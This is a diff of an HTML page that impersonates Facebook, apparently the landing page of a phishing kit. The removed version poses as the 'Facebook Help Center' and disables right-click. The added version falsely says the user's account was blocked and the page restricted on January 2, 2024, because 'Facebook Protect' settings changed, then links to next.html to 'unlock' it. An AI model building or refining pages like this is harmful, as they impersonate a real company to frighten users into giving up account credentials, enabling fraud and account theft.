@@ -1,109 +1,106 @@
-
-
-
 <!DOCTYPE html>
-
-
-<head>
-    <title>Action Required</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <style>
-        html,
-        body {
-            font-family: Roboto, sans-serif;
-            min-height: 100%;
-            height: 100%;
-            margin: 0;
-            padding: 0;
-        }
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: #f1f2f6;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
 
-        body {
-            background-color: #E4F5FE;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-        }
+      .container {
+        width: 90%;
+        max-width: 500px;
+        background-color: #fff;
+        border-radius: 10px;
+        padding: 20px;
+        text-align: center;
+      }
 
+      img {
+        width: 70%;
+        margin: 20px auto;
+      }
+
+      .message-heading {
+        font-weight: bold;
+        font-size: 1.5rem;
+      }
+
+      .message-body {
+        margin: 10px 0;
+        line-height: 1.5;
+      }
+
+      .notification-box {
+        display: flex;
+        align-items: center;
+        padding: 10px;
+        background-color: #f7f8fa;
+        border-radius: 5px;
+        margin: 10px 0;
+      }
+
+      .warning-icon {
+        width: 30px;
+        height: 30px;
+        margin-right: 10px;
+      }
+
+      .notification-text {
+        flex: 1;
+      }
+
+      .cta-button {
+        display: block;
+        width: 100%;
+        padding: 10px;
+        background-color: #3498db;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+        font-weight: bold;
+        margin-top: 10px;
+      }
+
+      @media screen and (min-width: 576px) {
         .container {
-            max-width: 600px;
-            padding: 20px;
-            background-color: #FFFFFF;
-            border-radius: 20px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+          width: 70%;
         }
-
-        .logo {
-            width: 80px;
-            height: 80px;
-            object-fit: cover;
-            border-radius: 50%;
-        }
-
-        h1 {
-            font-family: Roboto, sans-serif;
-            font-size: 32px;
-            font-weight: 700;
-            line-height: 1.4;
-            margin-top: 20px;
-            color: #232323;
-        }
-
-        h2 {
-            font-family: Roboto, sans-serif;
-            font-size: 24px;
-            font-weight: 700;
-            line-height: 1.4;
-            margin-top: 10px;
-            color: #232323;
-        }
-
-        .button {
-            background-color: #267CE5;
-            color: #FFFFFF;
-            font-family: Roboto, sans-serif;
-            font-size: 16px;
-            font-weight: 400;
-            padding: 16px 32px;
-            border-radius: 20px;
-            text-decoration: none;
-            display: inline-block;
-            margin-top: 20px;
-        }
-
-        .button:hover {
-            background-color: #1A5BBF;
-        }
-
-        .copyright {
-            color: #232323;
-            font-size: 14px;
-            margin-top: 30px;
-        }
-
-        .footer {
-            margin-top: 20px;
-        }
+      }
     </style>
-</head>
+  </head>
 
-<body>
+  <body>
     <div class="container">
-        <img class="logo" src="https://start-page.buffer.com/cdn-cgi/image/width=160,height=160/https://buffer-start-page-uploads.s3.amazonaws.com/64df12466e02a899e7c4b98a/1692340938315.logo%20fb.png" alt="Logo">
-        <h4>Facebook Help Center</h4>
-        <h2>We need additional information for your account safety click below to continue</h2>
-       <a class="button" href="next.html">Click Here</a>
-  </div>
-  <script type="text/javascript">
-        document.addEventListener("contextmenu", function(e) {
-            e.preventDefault();
-        });
-    </script>
-
-</body>
-
+      <img src="./src/f_locked.png" alt="Banner" />
+      <p class="message-heading">The security of your account is at risk.</p>
+      <p class="message-body">
+        We have temporarily blocked your account because your Facebook Protect
+        settings have been modified.
+      </p>
+      <div class="notification-box">
+        <div class="warning-icon">
+          <img src="./src/sign.png" alt="Warn" />
+        </div>
+        <div class="notification-text">
+          <p class="font-semibold">
+            Your page was restricted on January 2, 2024.
+          </p>
+          <p>We did this to protect your account from being suspended.</p>
+        </div>
+      </div>
+      <p class="message-body">
+        We will guide you through some steps to lift the page restriction and
+        unlock your account.
+      </p>
+      <a href="./next.html" class="cta-button">Continue</a>
+    </div>
+  </body>
 </html>
